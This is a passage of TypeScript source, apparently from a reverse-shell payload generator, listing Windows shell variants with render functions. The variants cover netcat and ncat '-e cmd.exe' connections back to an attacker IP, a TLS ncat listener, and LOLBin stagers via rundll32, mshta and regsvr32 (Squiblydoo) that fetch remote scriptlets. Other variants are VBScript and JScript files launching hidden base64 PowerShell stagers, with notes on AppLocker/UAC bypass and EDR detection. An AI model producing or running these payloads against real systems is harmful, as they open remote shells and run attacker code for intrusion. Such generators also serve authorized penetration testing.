    note: "nc.exe is NOT built into Windows — it must be staged/dropped on the target first (e.g. via an SMB share or the certutil download trick above).",
    render: (p) => `nc.exe -e cmd.exe ${p.ip} ${p.port}`,
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "ncat-exe",
    label: "ncat.exe -e cmd.exe",
    group: "Netcat",
    os: ["windows"],
    usesShellPath: false,
    note: "ncat.exe ships with Nmap for Windows — not built-in, but commonly staged as part of a pentest toolkit.",
    render: (p) => `ncat.exe ${p.ip} ${p.port} -e cmd.exe`,
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "ncat-exe-ssl",
    label: "ncat.exe --ssl -e cmd.exe (TLS)",
    group: "Netcat",
    os: ["windows"],
    usesShellPath: false,
    note: "Same staging requirement as plain ncat.exe, plus the attacker listener must also use --ssl (e.g. `ncat --ssl -lvp <port>`) to complete the TLS handshake.",
    render: (p) => `ncat.exe --ssl ${p.ip} ${p.port} -e cmd.exe`,
    listener: (p) => `ncat --ssl -lvp ${p.port}`,
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "rundll32-mshtml",
    label: "rundll32 (mshtml RunHTMLApplication)",
    group: "Living-off-the-Land",
    os: ["windows"],
    usesShellPath: false,
    note: "Abuses rundll32's mshtml.dll RunHTMLApplication export to run inline JScript that launches a base64 PowerShell stager — a well-known AppLocker/UAC-bypass LOLBin technique; expect detection on any EDR-monitored endpoint. The target IP/port are embedded inside the base64 blob, not shown in plaintext.",
    render: (p) =>
      `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -e ${encodedPsBlob(p)}")`,
    opaqueParams: ["ip", "port"],
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "mshta-stager",
    label: "mshta (VBScript stager)",
    group: "Living-off-the-Land",
    os: ["windows"],
    usesShellPath: false,
    note: "mshta.exe executes inline VBScript that launches the PowerShell stager — another common LOLBin technique for bypassing basic AppLocker rules. The target IP/port are embedded inside the base64 blob, not shown in plaintext.",
    render: (p) =>
      `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -w hidden -e ${encodedPsBlob(p)}"", 0 : window.close")`,
    opaqueParams: ["ip", "port"],
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "regsvr32-squiblydoo",
    label: "regsvr32 (Squiblydoo)",
    group: "Living-off-the-Land",
    os: ["windows"],
    usesShellPath: false,
    note: "Squiblydoo technique — requires hosting a malicious .sct file at the URL below first (e.g. `python3 -m http.server 8080`). That .sct file is where your actual reverse-shell code would live; this command only handles retrieval+execution, so the reverse-shell LPORT isn't part of this one-liner.",
    render: (p) => `regsvr32 /s /n /u /i:http://${p.ip}:8080/payload.sct scrobj.dll`,
    opaqueParams: ["port"],
    file: { extension: "bat", defaultMime: TEXT_PLAIN, toFileBody: (o) => o },
  },
  {
    id: "vbscript-stager",
    label: "VBScript (.vbs, PowerShell stager)",
    group: "VBScript",
    os: ["windows"],
    usesShellPath: false,
    note: "Runs a PowerShell -EncodedCommand stager via the WScript.Shell COM object — save as .vbs and run with `cscript payload.vbs` / `wscript payload.vbs`, or double-click. The target IP/port are embedded inside the base64 blob, not shown in plaintext.",
    render: (p) => `Set objShell = CreateObject("WScript.Shell")\nobjShell.Run "powershell -nop -w hidden -e ${encodedPsBlob(p)}", 0, False`,
    opaqueParams: ["ip", "port"],
    file: { extension: "vbs", defaultMime: "text/vbscript", toFileBody: (o) => o },
  },
  {
    id: "jscript-stager",
    label: "JScript (.js, PowerShell stager)",
    group: "JScript",
    os: ["windows"],
    usesShellPath: false,
    note: "Runs the same PowerShell stager via JScript's WScript.Shell COM object — execute with `cscript payload.js` / `wscript payload.js`. The target IP/port are embedded inside the base64 blob, not shown in plaintext.",
    render: (p) => `var shell = new ActiveXObject("WScript.Shell");\nshell.Run("powershell -nop -w hidden -e ${encodedPsBlob(p)}", 0, false);`,
    opaqueParams: ["ip", "port"],
    file: { extension: "js", defaultMime: "application/javascript", toFileBody: (o) => o },
  },
];

export const SHELLS_BY_ID: Record<ShellId, ShellVariant> = Object.fromEntries(SHELLS.map((s) => [s.id, s]));

export const SHELL_GROUPS: string[] = [...new Set(SHELLS.map((s) => s.group))];
